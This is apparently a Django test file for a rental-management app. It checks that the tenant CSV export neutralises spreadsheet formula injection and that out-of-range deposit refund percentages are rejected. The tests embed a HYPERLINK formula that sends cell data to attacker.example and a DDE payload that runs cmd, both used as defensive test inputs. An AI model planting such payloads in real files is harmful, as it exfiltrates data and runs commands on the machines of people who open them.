"""The tenant CSV export must not hand the landlord an executable spreadsheet.

`csv.writer` quotes and escapes correctly — that stops a value breaking the FILE
format. It does nothing about the value being interpreted as a FORMULA when the
file is opened, and the name, building and unit cells are typed in by staff.
"""
import csv
import datetime as dt
import io
from decimal import Decimal

from django.contrib.auth import get_user_model
from rest_framework.test import APIClient, APITestCase

from apps.buildings.models import Building, Unit, UnitStatus
from apps.common.csv_safety import csv_safe, csv_safe_row
from apps.tenants.models import Tenant, TenantStatus

User = get_user_model()

PAYLOAD = '=HYPERLINK("https://attacker.example/?d="&A1,"Statement")'


class CsvSafetyUnitTests(APITestCase):
    def test_formula_characters_are_neutralised(self):
        for payload in (PAYLOAD, "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"):
            assert csv_safe(payload).startswith("'"), f"{payload!r} was left executable"

    def test_ordinary_text_is_untouched(self):
        assert csv_safe("Mercy Murunga") == "Mercy Murunga"
        assert csv_safe("DON1A") == "DON1A"

    def test_numbers_stay_numbers(self):
        """A credit balance must stay a number, or every SUM in the sheet breaks."""
        assert csv_safe(12000) == 12000
        assert csv_safe(-500.5) == -500.5
        assert csv_safe(Decimal("-500.00")) == Decimal("-500.00")

    def test_none_becomes_an_empty_cell(self):
        assert csv_safe(None) == ""

    def test_a_whole_row_is_covered(self):
        row = csv_safe_row(["=cmd|'/c calc'!A0", "Block"])
        assert row == ["'=cmd|'/c calc'!A0", "Block"]


class TenantExportInjectionTests(APITestCase):
    @classmethod
    def setUpTestData(cls):
        cls.user = User.objects.create_user(
            username="x", email="x@test.com", password="testpass123!", role="owner",
        )
        building = Building.objects.create(name="Export Block", code="EX", total_floors=1)
        unit = Unit.objects.create(
            building=building, label="EX1", monthly_rent=Decimal("10000"),
            status=UnitStatus.OCCUPIED_UNPAID,
        )
        # Names are transcribed from documents at onboarding, and nothing
        # validates the shape of a human name.
        cls.tenant = Tenant.objects.create(
            first_name=PAYLOAD, last_name="Munga", id_number="EXP-1",
            phone="+254700000701", unit=unit, monthly_rent=Decimal("10000"),
            move_in_date=dt.date(2026, 1, 1), status=TenantStatus.ACTIVE,
        )

    def setUp(self):
        self.client = APIClient()
        self.client.force_authenticate(user=self.user)

    def _rows(self):
        response = self.client.get("/api/tenants/export/")
        assert response.status_code == 200
        return list(csv.reader(io.StringIO(response.content.decode())))

    def test_a_formula_in_a_tenant_name_is_exported_as_text(self):
        header, row = self._rows()
        assert header[0] == "Tenant"
        assert row[0] == "'" + PAYLOAD + " Munga"
        for cell in row:
            assert not cell.startswith("="), f"executable cell: {cell!r}"

    def test_the_rest_of_the_row_is_unchanged(self):
        _, row = self._rows()
        assert row[1:3] == ["Export Block", "EX1"]
        assert row[3] == "0.00"

    def test_a_credit_balance_stays_a_number(self):
        from apps.tenants import views

        original = views.rent_roll_balances
        views.rent_roll_balances = lambda qs: {self.tenant.pk: Decimal("-500")}
        try:
            _, row = self._rows()
        finally:
            views.rent_roll_balances = original
        assert row[3] == "-500.00"


class MoveOutRefundBoundTests(APITestCase):
    @classmethod
    def setUpTestData(cls):
        cls.user = User.objects.create_user(
            username="m", email="m@test.com", password="testpass123!", role="owner",
        )
        building = Building.objects.create(name="Bound Block", code="BB", total_floors=1)
        unit = Unit.objects.create(
            building=building, label="BB1", monthly_rent=Decimal("10000"),
            status=UnitStatus.OCCUPIED_PAID,
        )
        cls.tenant = Tenant.objects.create(
            first_name="Ann", last_name="Bound", id_number="BND-1",
            phone="+254700000702", unit=unit, monthly_rent=Decimal("10000"),
            move_in_date=dt.date(2026, 1, 1), status=TenantStatus.ACTIVE,
            deposit_paid=Decimal("10000"),
        )

    def setUp(self):
        self.client = APIClient()
        self.client.force_authenticate(user=self.user)

    def _move_out(self, pct):
        return self.client.post(
            f"/api/tenants/{self.tenant.pk}/move-out/",
            {"move_out_date": "2026-04-30", "deposit_refund_percentage": pct},
            format="json",
        )

    def test_a_refund_above_100_percent_is_refused(self):
        assert self._move_out("999.99").status_code == 400
        self.tenant.refresh_from_db()
        assert self.tenant.status == TenantStatus.ACTIVE

    def test_a_negative_refund_is_refused(self):
        assert self._move_out("-1").status_code == 400

    def test_a_full_refund_is_still_accepted(self):
        assert self._move_out("100").status_code == 200
